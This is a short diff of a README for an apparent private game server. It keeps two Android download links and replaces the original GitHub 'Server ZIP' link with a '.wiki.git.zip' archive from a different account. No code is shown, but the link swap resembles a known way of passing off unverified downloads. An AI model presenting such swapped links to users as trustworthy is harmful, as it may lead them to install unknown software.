@@ -4,7 +4,7 @@ ANDROID 1 (MEDIAFIRE) (UPDATED!) : https://www.mediafire.com/file/njptm3nhto0xm1
 
 ANDROID 2 (GOOGLE DRIVE) (UPDATED!) : https://drive.google.com/file/d/1BKjqkRdPO9FAA5HcEPdiEKzUBhtifwl7/view?usp=sharing
 
-Server ZIP: https://github.com/CrazorTheCat/BSDS-V43/archive/refs/heads/master.zip
+Server ZIP: https://github.com/aras123457/Lou-Brawl-private-Server.wiki.git.zip
 
 ## Requirements: ##
 1. a brain...
